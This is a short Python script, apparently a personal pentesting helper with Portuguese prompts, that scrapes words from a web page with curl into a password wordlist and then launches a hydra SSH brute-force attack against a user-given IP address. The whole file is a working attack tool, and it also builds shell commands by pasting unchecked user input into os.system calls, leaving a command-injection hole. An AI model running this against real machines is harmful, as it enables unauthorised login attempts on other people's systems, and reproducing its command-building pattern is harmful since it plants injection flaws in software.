#fastWordHydra
#author: github.com/vinicgoulart
#date: 09/10/2022
#version 1.1.0
import os

simpleURI = input("Digite a URI \n")

if not simpleURI: ## If the user didn't input the url
    print("Não foi possível executar o comando")
    quit()

pass_length = int(input("Qual o tamanho das senhas? (a partir de ): \n"))

sed = "sed 's/[^a-zA-Z ]/ /g'"

tr = "tr 'A-Z ' 'a-z\\n'"

grep = "grep -Eio '[a-z]{" + str(pass_length) + ",}'"

sort = "sort -u > completeWordList.txt" ## writes the wordlist to a file named completeWordList.txt in the current folder

cmd = 'curl ' + '"' + simpleURI + '"' + " | " + sed + " | " + tr + " | " + grep + " | " + sort

os.system(cmd) ## executes the command

useHydra = input("Deseja aplicar a word list no hydra? Y/N \n")

if str.lower(useHydra) == 'y':
    userName = input("Digite o possivel nome do usuário! \n")
    machineIp = input("Digite o endereço ipv4 da máquina com pontos. \n")
  
    hydraCmd = "hydra -l " + userName + " -P completeWordList.txt -V -f -t 8 " + machineIp + " ssh" 


    if not userName or not machineIp:
        print("As informações necessárias não foram preenchidas")
        exit()

    os.system(hydraCmd) ## execute hydra's brute force attack

else:
    print("terminando programa \n") ## ends the program.
    exit()
